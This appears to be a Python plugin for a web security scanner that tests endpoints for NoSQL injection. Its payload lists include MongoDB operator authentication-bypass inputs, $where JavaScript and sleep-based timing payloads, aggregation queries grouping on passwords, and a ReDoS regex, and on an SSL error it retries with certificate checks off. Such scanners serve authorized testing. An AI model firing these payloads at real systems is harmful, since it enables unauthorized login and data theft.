"""
Enhanced NoSQL Injection Detection Plugin

This plugin detects various NoSQL injection vulnerabilities including:
- MongoDB operator injection
- JSON injection attacks
- Authentication bypass attempts
- Query manipulation
- Aggregation pipeline injection
- Server-side JavaScript injection
"""

import requests
import json
import logging
from typing import Tuple, Optional, Dict, Any, List
from urllib.parse import urlencode
from plugins.base import PluginBase, PluginMetadata, PluginPriority

logger = logging.getLogger(__name__)


class NoSQLPlugin(PluginBase):
    """Advanced NoSQL injection security testing plugin."""
    
    # Configuration
    DEFAULT_TIMEOUT = 10
    MAX_RETRIES = 2
    
    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="NoSQL Injection",
            version="2.0.0",
            author="VIPHacker100",
            description="Comprehensive NoSQL injection vulnerability detection (MongoDB, CouchDB, etc.)",
            priority=PluginPriority.NORMAL,
            tags=["nosql", "mongodb", "injection"]
        )
    
    def supports_url(self, url: str) -> bool:
        """
        Check if URL might be vulnerable to NoSQL injection.
        Returns True for most endpoints since NoSQL can be used anywhere.
        """
        # NoSQL can be used in any endpoint, but certain patterns are more likely
        nosql_indicators = [
            '/api/',
            '/login',
            '/auth',
            '/user',
            '/search',
            '/query',
            '/data',
            '.json'
        ]
        url_lower = url.lower()
        return any(indicator in url_lower for indicator in nosql_indicators)
    
    def detect(self, url: str, response: Any = None) -> Tuple[bool, Optional[Dict]]:
        """
        Perform comprehensive NoSQL vulnerability detection.
        
        Args:
            url: Target endpoint URL
            response: Optional initial response object
            
        Returns:
            Tuple of (vulnerability_found, details_dict)
        """
        vulnerabilities = {}
        
        # Test 1: MongoDB operator injection (JSON)
        mongo_json_result = self._test_mongodb_json_operators(url)
        if mongo_json_result:
            vulnerabilities['mongodb_json_injection'] = mongo_json_result
        
        # Test 2: MongoDB operator injection (URL-encoded)
        mongo_url_result = self._test_mongodb_url_operators(url)
        if mongo_url_result:
            vulnerabilities['mongodb_url_injection'] = mongo_url_result
        
        # Test 3: Authentication bypass
        auth_bypass_result = self._test_authentication_bypass(url)
        if auth_bypass_result:
            vulnerabilities['authentication_bypass'] = auth_bypass_result
        
        # Test 4: Boolean-based injection
        boolean_result = self._test_boolean_injection(url)
        if boolean_result:
            vulnerabilities['boolean_injection'] = boolean_result
        
        # Test 5: JavaScript injection
        js_result = self._test_javascript_injection(url)
        if js_result:
            vulnerabilities['javascript_injection'] = js_result
        
        # Test 6: Aggregation pipeline injection
        aggregation_result = self._test_aggregation_injection(url)
        if aggregation_result:
            vulnerabilities['aggregation_injection'] = aggregation_result
        
        # Test 7: Regex injection
        regex_result = self._test_regex_injection(url)
        if regex_result:
            vulnerabilities['regex_injection'] = regex_result
        
        # Test 8: Time-based blind injection
        timing_result = self._test_timing_injection(url)
        if timing_result:
            vulnerabilities['timing_injection'] = timing_result
        
        if vulnerabilities:
            return True, {
                'vulnerabilities': vulnerabilities,
                'risk_level': self._calculate_risk_level(vulnerabilities),
                'database_type': self._identify_database_type(vulnerabilities),
                'recommendations': self._generate_recommendations(vulnerabilities)
            }
        
        return False, None
    
    def _make_request(self, url: str, method: str = 'POST', 
                      data: Any = None, params: Optional[Dict] = None,
                      headers: Optional[Dict[str, str]] = None,
                      measure_time: bool = False) -> Optional[Tuple[requests.Response, float]]:
        """
        Make a safe HTTP request with error handling.
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST, etc.)
            data: Data to send (dict, string, or bytes)
            params: URL parameters
            headers: Optional custom headers
            measure_time: Whether to measure response time
            
        Returns:
            Tuple of (Response object, elapsed_time) or (None, 0) if request failed
        """
        default_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'Security-Scanner/2.0'
        }
        
        if headers:
            default_headers.update(headers)
        
        # Prepare kwargs for request
        kwargs = {
            'headers': default_headers,
            'timeout': self.DEFAULT_TIMEOUT,
            'verify': True,
            'allow_redirects': True
        }
        
        if params:
            kwargs['params'] = params
        
        # Handle different data types
        if data is not None:
            if isinstance(data, dict):
                kwargs['json'] = data
            elif isinstance(data, str):
                kwargs['data'] = data
            else:
                kwargs['data'] = data
        
        try:
            import time
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = requests.get(url, **kwargs)
            elif method.upper() == 'POST':
                response = requests.post(url, **kwargs)
            elif method.upper() == 'PUT':
                response = requests.put(url, **kwargs)
            else:
                response = requests.request(method, url, **kwargs)
            
            elapsed_time = time.time() - start_time
            return response, elapsed_time
            
        except requests.exceptions.Timeout:
            logger.warning(f"Request timeout for {url}")
        except requests.exceptions.SSLError:
            logger.warning(f"SSL verification failed for {url}")
            # Retry without verification
            try:
                kwargs['verify'] = False
                import time
                start_time = time.time()
                response = requests.request(method, url, **kwargs)
                elapsed_time = time.time() - start_time
                return response, elapsed_time
            except Exception as e:
                logger.error(f"Request failed even without SSL verification: {e}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Request failed for {url}: {e}")
        except Exception as e:
            logger.error(f"Unexpected error during request: {e}")
        
        return None, 0
    
    def _test_mongodb_json_operators(self, url: str) -> Optional[Dict]:
        """Test MongoDB operator injection via JSON payload."""
        # MongoDB operator payloads
        payloads = [
            # Authentication bypass
            {
                "username": {"$ne": None},
                "password": {"$ne": None}
            },
            {
                "username": {"$gt": ""},
                "password": {"$gt": ""}
            },
            # Data extraction
            {
                "username": {"$regex": ".*"},
                "password": {"$exists": True}
            },
            # OR injection
            {
                "$or": [
                    {"username": "admin"},
                    {"username": {"$ne": "nothing"}}
                ]
            },
            # Where clause injection
            {
                "$where": "this.username == 'admin'"
            },
            # Array operators
            {
                "roles": {"$in": ["admin", "superuser"]}
            }
        ]
        
        for payload in payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response and response.status_code in [200, 201]:
                    try:
                        # Check if response indicates successful authentication or data leak
                        response_text = response.text.lower()
                        success_indicators = [
                            'success', 'token', 'authenticated', 'welcome',
                            'dashboard', 'profile', 'session', 'logged in'
                        ]
                        
                        # Also check for substantial response (not just error)
                        if (any(indicator in response_text for indicator in success_indicators) or
                            (len(response.text) > 100 and 'error' not in response_text and
                             'invalid' not in response_text)):
                            return {
                                'vulnerable': True,
                                'payload': json.dumps(payload),
                                'severity': 'critical',
                                'description': 'MongoDB operator injection successful via JSON',
                                'response_code': response.status_code,
                                'evidence': self._extract_snippet(response.text)
                            }
                    except Exception as e:
                        logger.debug(f"Error analyzing response: {e}")
                        continue
        
        return None
    
    def _test_mongodb_url_operators(self, url: str) -> Optional[Dict]:
        """Test MongoDB operator injection via URL parameters."""
        # URL-encoded MongoDB operators
        payloads = [
            {"username[$ne]": "invalid", "password[$ne]": "invalid"},
            {"username[$gt]": "", "password[$gt]": ""},
            {"username[$regex]": "^admin", "password[$exists]": "true"},
            {"email[$nin][]": "fake@test.com"},
        ]
        
        for payload in payloads:
            result = self._make_request(url, method='GET', params=payload)
            if result:
                response, _ = result
                if response and response.status_code in [200, 201]:
                    response_text = response.text.lower()
                    if (len(response.text) > 100 and 
                        'error' not in response_text and
                        'invalid' not in response_text):
                        return {
                            'vulnerable': True,
                            'payload': urlencode(payload),
                            'severity': 'critical',
                            'description': 'MongoDB operator injection successful via URL parameters',
                            'response_code': response.status_code
                        }
        
        return None
    
    def _test_authentication_bypass(self, url: str) -> Optional[Dict]:
        """Test for authentication bypass using NoSQL injection."""
        # Common authentication bypass payloads
        bypass_payloads = [
            # Always true conditions
            {
                "username": {"$ne": None},
                "password": {"$ne": None}
            },
            # Array tricks
            {
                "username": {"$in": ["admin", "administrator", "root"]},
                "password": {"$exists": True}
            },
            # String-based
            {
                "username": "admin",
                "password": {"$ne": "wrong_password"}
            }
        ]
        
        for payload in bypass_payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response and response.status_code == 200:
                    try:
                        data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                        
                        # Look for authentication success indicators
                        if any(key in str(data).lower() for key in ['token', 'session', 'success', 'authenticated']):
                            return {
                                'vulnerable': True,
                                'payload': json.dumps(payload),
                                'severity': 'critical',
                                'description': 'Authentication bypass successful using NoSQL injection',
                                'attack_type': 'auth_bypass'
                            }
                    except Exception:
                        pass
        
        return None
    
    def _test_boolean_injection(self, url: str) -> Optional[Dict]:
        """Test for boolean-based NoSQL injection."""
        # Boolean-based payloads
        true_payloads = [
            {"id": {"$ne": "nonexistent"}},
            {"status": {"$gt": ""}},
        ]
        
        false_payloads = [
            {"id": {"$eq": "definitely_nonexistent_id_12345"}},
            {"status": {"$regex": "^$"}},  # Match nothing
        ]
        
        true_responses = []
        false_responses = []
        
        # Test true conditions
        for payload in true_payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response:
                    true_responses.append(len(response.text))
        
        # Test false conditions
        for payload in false_payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response:
                    false_responses.append(len(response.text))
        
        # If true and false responses are consistently different, likely vulnerable
        if true_responses and false_responses:
            avg_true = sum(true_responses) / len(true_responses)
            avg_false = sum(false_responses) / len(false_responses)
            
            # Significant difference indicates boolean-based injection
            if abs(avg_true - avg_false) > 50:
                return {
                    'vulnerable': True,
                    'severity': 'high',
                    'description': 'Boolean-based NoSQL injection detected',
                    'true_response_avg': avg_true,
                    'false_response_avg': avg_false
                }
        
        return None
    
    def _test_javascript_injection(self, url: str) -> Optional[Dict]:
        """Test for JavaScript injection in NoSQL queries."""
        # JavaScript injection payloads (MongoDB $where)
        js_payloads = [
            {"$where": "function() { return true; }"},
            {"$where": "this.password.length > 0"},
            {"username": {"$regex": ".*"}, "$where": "this.username == 'admin'"}
        ]
        
        error_indicators = [
            'javascript', 'function', 'syntax error', 'compile',
            'script', 'eval', 'parse error'
        ]
        
        for payload in js_payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response:
                    response_text = response.text.lower()
                    
                    # Check for JavaScript-related errors
                    if any(indicator in response_text for indicator in error_indicators):
                        return {
                            'vulnerable': True,
                            'payload': json.dumps(payload),
                            'severity': 'critical',
                            'description': 'Server-side JavaScript injection detected',
                            'evidence': self._extract_snippet(response.text)
                        }
        
        return None
    
    def _test_aggregation_injection(self, url: str) -> Optional[Dict]:
        """Test for aggregation pipeline injection."""
        # MongoDB aggregation payloads
        agg_payloads = [
            {
                "$lookup": {
                    "from": "users",
                    "localField": "_id",
                    "foreignField": "userId",
                    "as": "userData"
                }
            },
            {
                "$group": {"_id": "$password"}
            }
        ]
        
        for payload in agg_payloads:
            result = self._make_request(url, method='POST', data=payload)
            if result:
                response, _ = result
                if response and response.status_code == 200:
                    # Check for aggregation-specific responses
                    if len(response.text) > 100:
                        return {
                            'vulnerable': True,
                            'payload': json.dumps(payload),
                            'severity': 'high',
                            'description': 'Aggregation pipeline injection possible'
                        }
        
        return None
    
    def _test_regex_injection(self, url: str) -> Optional[Dict]:
        """Test for regex injection attacks."""
        # ReDoS and data extraction via regex
        regex_payloads = [
            {"username": {"$regex": "^admin"}},  # Starts with admin
            {"email": {"$regex": ".*@.*"}},  # Any email
            {"password": {"$regex": "^.{0,}$"}},  # Any password
            # Potential ReDoS
            {"field": {"$regex": "(a+)+b"}}
        ]
        
        for payload in regex_payloads:
            result = self._make_request(url, method='POST', data=payload, measure_time=True)
            if result:
                response, elapsed_time = result
                if response:
                    # Check for successful regex processing or timing anomaly
                    if (response.status_code == 200 and len(response.text) > 50) or elapsed_time > 5:
                        return {
                            'vulnerable': True,
                            'payload': json.dumps(payload),
                            'severity': 'medium',
                            'description': 'Regex injection successful',
                            'response_time': elapsed_time
                        }
        
        return None
    
    def _test_timing_injection(self, url: str) -> Optional[Dict]:
        """Test for time-based blind NoSQL injection."""
        # Baseline request
        baseline_result = self._make_request(url, method='POST', 
                                             data={"username": "test", "password": "test"})
        if not baseline_result:
            return None
        
        _, baseline_time = baseline_result
        
        # Time-based payloads (MongoDB sleep)
        timing_payloads = [
            {"username": "admin", "$where": "sleep(5000) || true"},
            {"username": {"$regex": "^admin"}, "$where": "sleep(5000)"}
        ]
        
        for payload in timing_payloads:
            result = self._make_request(url, method='POST', data=payload, measure_time=True)
            if result:
                response, elapsed_time = result
                
                # If response takes significantly longer, timing attack works
                if elapsed_time > baseline_time + 4:  # 4+ second delay
                    return {
                        'vulnerable': True,
                        'payload': json.dumps(payload),
                        'severity': 'high',
                        'description': 'Time-based blind NoSQL injection detected',
                        'baseline_time': baseline_time,
                        'injection_time': elapsed_time,
                        'delay': elapsed_time - baseline_time
                    }
        
        return None
    
    def _extract_snippet(self, text: str, max_length: int = 200) -> str:
        """Extract relevant snippet from response."""
        if len(text) <= max_length:
            return text
        return text[:max_length] + "..."
    
    def _identify_database_type(self, vulnerabilities: Dict) -> str:
        """Identify the likely NoSQL database type."""
        if any('mongodb' in str(v).lower() for v in vulnerabilities.values()):
            return 'MongoDB'
        elif any('couch' in str(v).lower() for v in vulnerabilities.values()):
            return 'CouchDB'
        else:
            return 'Unknown NoSQL'
    
    def _calculate_risk_level(self, vulnerabilities: Dict) -> str:
        """Calculate overall risk level based on detected vulnerabilities."""
        severity_scores = {
            'critical': 4,
            'high': 3,
            'medium': 2,
            'low': 1
        }
        
        max_severity = 0
        for vuln in vulnerabilities.values():
            if isinstance(vuln, dict) and 'severity' in vuln:
                severity = vuln['severity']
                max_severity = max(max_severity, severity_scores.get(severity, 0))
        
        if max_severity >= 4:
            return 'critical'
        elif max_severity >= 3:
            return 'high'
        elif max_severity >= 2:
            return 'medium'
        else:
            return 'low'
    
    def _generate_recommendations(self, vulnerabilities: Dict) -> List[str]:
        """Generate security recommendations based on found vulnerabilities."""
        recommendations = []
        
        if any('mongodb' in k for k in vulnerabilities.keys()):
            recommendations.append("Disable MongoDB operators in user input")
            recommendations.append("Use parameterized queries with proper type casting")
            recommendations.append("Implement strict input validation and sanitization")
        
        if 'authentication_bypass' in vulnerabilities:
            recommendations.append("Implement multi-factor authentication")
            recommendations.append("Use proper password hashing (bcrypt, Argon2)")
            recommendations.append("Add rate limiting to authentication endpoints")
        
        if 'javascript_injection' in vulnerabilities:
            recommendations.append("Disable $where operator in MongoDB")
            recommendations.append("Use MongoDB's built-in query operators instead of JavaScript")
            recommendations.append("Enable MongoDB security features and authentication")
        
        if 'timing_injection' in vulnerabilities:
            recommendations.append("Disable JavaScript execution in database queries")
            recommendations.append("Implement query timeout limits")
        
        if 'regex_injection' in vulnerabilities:
            recommendations.append("Validate and sanitize regex patterns")
            recommendations.append("Set regex complexity limits to prevent ReDoS")
            recommendations.append("Use exact matches instead of regex where possible")
        
        # General recommendations
        recommendations.extend([
            "Use ORM/ODM libraries with built-in protection",
            "Implement principle of least privilege for database accounts",
            "Enable database query logging and monitoring",
            "Keep database software updated with latest security patches",
            "Use Content Security Policy headers",
            "Implement proper error handling (avoid exposing database errors)"
        ])
        
        return list(set(recommendations))  # Remove duplicates